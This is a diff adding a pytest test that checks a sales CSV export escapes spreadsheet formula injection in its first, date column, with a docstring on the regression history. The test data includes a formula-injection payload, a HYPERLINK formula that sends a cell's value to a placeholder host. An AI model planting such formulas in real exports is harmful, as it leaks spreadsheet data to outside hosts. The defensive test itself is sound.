@@ -573,6 +573,32 @@ def test_sales_csv_when_column_is_business_date(client, session, product):
     assert rows[1][-1][:10] != rows[1][0]
 
 
+def test_sales_csv_when_column_is_formula_escaped(client, session, product):
+    """WR-04 (33-REVIEW): column 1 is now a pass-through of STORED BYTES.
+
+    Before Phase 33 it was `iso_to_local(...)`, which can only produce
+    `dd.mm.yyyy HH:MM` — genuinely not free text, so leaving it outside
+    `_csv_safe` was safe. D-23 changed it to `format_ru_date(...)`, and the
+    CR-01 fix then made that filter return the stored value verbatim on
+    anything it does not recognise. So the module's own T-06-10 invariant
+    («any free-text value starting with =, +, - or @ is apostrophe-prefixed»)
+    stopped holding for the file's FIRST column.
+
+    The value is written through `record_operation` directly, which is the
+    honest reproduction: `parse_op_date` guards the 14 operator surfaces and
+    `parse_exchange` guards the wire, but this is the second layer, and the
+    argument for having one is the same one that justified hardening
+    `format_ru_date` rather than trusting the gate.
+    """
+    poisoned = '=HYPERLINK("http://x/"&A2,"click")'
+    _record_sale_op(session, product, business_date=poisoned)
+
+    rows = _route_rows(client.get("/export/sales.csv"))
+
+    assert any(row[0] == "'" + poisoned for row in rows[1:]), rows
+    assert not any(row[0].startswith("=") for row in rows[1:])
+
+
 def test_cash_csv_when_column_is_business_date(session):
     """D-23, the cash twin: same rule on CashMovement."""
     back_dated = date(2026, 6, 15)
